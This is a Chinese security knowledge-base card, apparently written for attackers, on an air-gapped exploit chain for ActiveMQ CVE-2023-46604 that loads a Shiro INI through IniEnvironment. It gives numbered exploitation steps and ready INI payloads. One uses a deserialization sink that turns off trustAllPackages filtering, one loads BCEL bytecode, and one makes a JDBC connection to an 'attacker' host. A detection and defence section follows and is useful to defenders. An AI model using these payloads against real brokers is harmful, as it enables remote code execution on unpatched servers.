---
id: web-java-deserialization-activemq-46604-intranet-ini-environment-getter-setter
title: ActiveMQ CVE-2023-46604 不出网利用：IniEnvironment 加载 Shiro INI 触发 getter/setter 链
type: scenario
domain: web
path: web/java/deserialization
technique: activemq-ini-environment-shiro-ini-getter-setter
tags:
- java
- activemq
- openwire
- deserialization
- shiro
- bcel
- gadget
- cve-2023-46604
cve:
- CVE-2023-46604
severity: critical
confidence: high
status: verified
affected_versions: Apache ActiveMQ <5.15.16、5.16.x <5.16.7、5.17.x <5.17.6、5.18.x <5.18.3（原文公告：修复版本 5.15.16/5.16.7/5.17.6/5.18.3）
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-42
  verified_at: '2026-11-05T06:31:48+08:00'
  notes: 已对照原文核对：IniEnvironment(String) 构造器 new Ini().load(iniConfig) 后 this.init()（img/54）；Shiro INI 的 [main] 段按 JavaBean/BeanUtils 装配，a.b.c=v 走 getB().getC().setXxx，CTFCON 2024 幻灯片示例一致（img/57-61）；sink1 ActiveMQObjectMessage.getObject 在 object==null&&content!=null 时用 ClassLoadingAwareObjectInputStream.readObject，默认包白名单为 java.lang/org.apache.activemq/org.fusesource.hawtbuf/com.thoughtworks.xstream.mapper，需 trustAllPackages=true（img/61 与正文）；INI payload（bs.data/length/offset、message.content=$bs、message.trustAllPackages=true、message.object.x=x）与原文一致；sink2 BasicDataSource.createDataSource 的 Class.forName(driverClassName,true,driverClassLoader)+BCEL ClassLoader 与原文一致；JDBC 变体原文注明 activemq 未带驱动、不能直接打，卡内已注明需目标 classpath 有驱动。注意：不出网一节的截图多为 xzfile 外链（本地 img 仅 61 张，不含这些图），原文本节未展示本机命令执行回显，链基于 CTFCON 研究与已知 gadget，卡片 confidence=high 可接受但属转述验证；另“只使用 ActiveMQ 自带依赖（shiro、commons-beanutils、dbcp2...）”表述略宽，dbcp2 需目标 classpath 存在，卡片触发条件已单独列出。未在本机复现。
url: /docs/web/java/deserialization/web-java-deserialization-activemq-46604-intranet-ini-environment-getter-setter/
draft: false
kb_aliases:
- CVE-2023-46604 不出网
- ActiveMQ IniEnvironment
- Shiro INI getter setter
- ActiveMQObjectMessage getObject 不出网
- BasicDataSource BCEL 不出网
---

## 一句话结论

CVE-2023-46604 的任意 String 构造方法调用不只能加载远程 Spring XML：把 `org.apache.activemq.shiro.env.IniEnvironment` 作为类名、把一段 Shiro INI 文本作为参数，就能让 Shiro 在解析 `[main]` 时按 JavaBean 规则实例化任意类并调用 getter/setter；再以 `ActiveMQObjectMessage.getObject()`（配合 `trustAllPackages=true` 的原生反序列化）或 `BasicDataSource.getConnection()`（BCEL 类加载）作为 sink，可在目标不出网时完成 RCE。

## 原理

- **复用 CVE-2023-46604 的构造方法调用**：`BaseDataStreamMarshaller.createThrowable()` 只要求类有 `public` 的单 `String` 构造方法。`org.apache.activemq.shiro.env.IniEnvironment(String iniConfig)` 正是这样的类：它执行 `new Ini().load(iniConfig)`，保存后调用 `init()`。
- **Shiro INI 是 JavaBean 装配器**：`[main]` 段中 `name = 全限定类名` 会实例化对象；`name.property = value` 通过 Apache Commons BeanUtils 调用对应的 `setXxx`；`$name` 引用已定义对象；`a.b.c = value` 会沿 `getB()`、`getC()` 逐层取值后调用 `setXxx`。因此 INI 文本等价于“任意类实例化 + 任意 getter/setter 调用”的小型表达式。
- **sink 1：ActiveMQObjectMessage.getObject()**：
  - `getObject()` 在 `object == null && content != null` 时，用 `ClassLoadingAwareObjectInputStream` 反序列化 `content`，并把它包装成 `ByteSequence`；
  - 默认 `ClassLoadingAwareObjectInputStream` 有包白名单（`java.lang`、`org.apache.activemq`、`org.fusesource.hawtbuf`、`com.thoughtworks.xstream.mapper`），普通反序列化会被拦截；
  - 但 INI 可以先把 `message.trustAllPackages` 设为 `true`，再设置 `content`，从而关闭白名单；随后 `message.object.x = x` 强制调用 `getObject()`，触发 `readObject()`。原文使用 `PriorityQueue + BeanComparator + TemplatesImpl` 的原生链（Base64 序列化数据放入 `ByteSequence.data`）。
- **sink 2：BasicDataSource.getConnection()**：
  - `org.apache.commons.dbcp2.BasicDataSource.createDataSource()` 调用 `Class.forName(driverClassName, true, driverClassLoader)`；
  - INI 把 `driverClassLoader` 设为 `com.sun.org.apache.bcel.internal.util.ClassLoader`，把 `driverClassName` 设为 `$$BCEL$$...` 编码的恶意字节码，即可在加载驱动时定义并执行类；
  - 也可把 `url` 指向恶意 JDBC 服务（如 MySQL）触发反序列化，但 ActiveMQ 依赖中不一定带对应驱动，BCEL 更直接。
- **为什么“不出网”**：整个链路只使用 ActiveMQ 自带依赖（shiro、commons-beanutils、dbcp2、JDK 的 BCEL ClassLoader）和构造方法参数中的本地字符串，不需要目标访问攻击者的 HTTP/XML；适合目标容器不能出网、只能访问 61616 的场景。
- **前置**：仍需能够向 OpenWire 端口发送恶意 `ExceptionResponse`；`IniEnvironment` 必须在 classpath 上（ActiveMQ 的 shiro 模块/依赖中存在）。

## 触发条件

- 目标为 Apache ActiveMQ Classic 受影响版本（原文公告：修复版本 5.15.16、5.16.7、5.17.6、5.18.3）。
- 攻击者可访问 61616 并发送原始 OpenWire 帧（同 CVE-2023-46604 主卡）。
- classpath 中存在 `org.apache.activemq.shiro.env.IniEnvironment`、Shiro、Commons BeanUtils；sink 1 还依赖 `ActiveMQObjectMessage`、`ByteSequence`、可用的反序列化 gadget；sink 2 依赖 `commons-dbcp2` 与 JDK 8 的 BCEL ClassLoader（`com.sun.org.apache.bcel.internal.util.ClassLoader`）。
- 目标未升级到修复版本，且未限制 OpenWire 报文中的类名/构造方法。

## 利用步骤

1. 按 CVE-2023-46604 主卡构造 `ExceptionResponse`，把 `className` 设为 `org.apache.activemq.shiro.env.IniEnvironment`，`message` 设为完整的 Shiro INI 文本。
2. 选择 sink：
   - **原生反序列化**：INI 中定义 `ByteSequence` 与 `ActiveMQObjectMessage`，设置 `bs.data` 为 gadget 的 Base64 序列化数据、`bs.length`、`bs.offset`，设置 `message.content = $bs`、`message.trustAllPackages = true`，最后用 `message.object.x = x` 触发 `getObject()`；
   - **BCEL**：INI 中定义 `BasicDataSource`，设置 `driverClassLoader` 为 BCEL ClassLoader、`driverClassName` 为 `$$BCEL$$...`，用 `bds.connection.a = a` 触发 `getConnection()`。
3. 目标解析 INI → 实例化对象/调用 setter → 触发 sink → 反序列化或类加载执行命令。
4. 用标记文件/回连确认；不出网时通过 DNS/时间盲判或命令写本地文件验证。

## PoC

Shiro INI（原生反序列化 sink，序列化数据需替换为实际 gadget）：

```ini
[main]
bs = org.apache.activemq.util.ByteSequence
message = org.apache.activemq.command.ActiveMQObjectMessage
bs.data = rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1Z...
bs.length = 999999
bs.offset = 0
message.content = $bs
message.trustAllPackages = true
message.object.x = x
```

Shiro INI（BCEL sink）：

```ini
[main]
bds = org.apache.commons.dbcp2.BasicDataSource
bds.driverClassLoader = com.sun.org.apache.bcel.internal.util.ClassLoader
bds.driverClassName = "$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQMo$d3$40$Q$7d$9b..."
bds.connection.a = a
```

JDBC 变体（需要目标 classpath 有对应驱动）：

```ini
[main]
datasource=org.apache.commons.dbcp2.BasicDataSource
datasource.url=jdbc:mysql://attacker:3306/db1
datasource.password=x
datasource.username=x
datasource.driverClassName=com.mysql.cj.jdbc.Driver
datasource.connection.x=x
```

发送时把上述 INI 文本作为 `createThrowable` 的 `message`，类名设为 `org.apache.activemq.shiro.env.IniEnvironment`。

## 变体与关联

- **sink 选择**：`ActiveMQObjectMessage.getObject` 适合目标 classpath 有成熟 gadget 且能关掉 `trustAllPackages` 白名单；`BasicDataSource.getConnection` 适合能用 BCEL/JDBC 的场景。
- **其他单 String 构造方法**：可用 CodeQL/Tabby 枚举 `(java.lang.String)` 构造方法，再逐个审计副作用；`IniEnvironment` 只是其中较通用的一个。
- **回显技巧**：ActiveMQ-RCE-Exploit 等工具会在恶意字节码中取当前线程的 `TcpTransport`，复用其 `socket` 把命令结果写回客户端；这属于利用工程，不改变漏洞链。
- 关联卡片：[[web-java-deserialization-activemq-openwire-throwable-constructor-rce]]、[[web-java-deserialization-camel-jms-objectmessage-rce]]。

## 检测与防御

- **网络侧**：OpenWire 报文中出现 `org.apache.activemq.shiro.env.IniEnvironment`、`[main]`、`org.apache.activemq.command.ActiveMQObjectMessage`、`trustAllPackages`、`BasicDataSource`、`$$BCEL$$`、`com.sun.org.apache.bcel.internal.util.ClassLoader` 等字符串，是强特征；可对 `createThrowable` 的类名字段做白名单。
- **主机侧**：ActiveMQ 进程加载 `IniEnvironment`、解析 Shiro INI、`ClassLoadingAwareObjectInputStream.readObject`、BCEL ClassLoader 定义类；`getConnection` 触发外部 JDBC 连接。
- **防御**：升级到修复版本；限制 OpenWire 端口的来源；启用类白名单/`ObjectInputFilter`；移除不必要的 shiro/dbcp2 依赖；禁止 broker 任意出网与 JDBC 出站；监控 `$$BCEL$$` 与异常类加载。
- **排查**：搜索 broker 日志中的 `IniEnvironment`/`createThrowable` 异常、临时文件、异常 JDBC 连接；对 61616 历史流量做字符串与帧结构回溯。
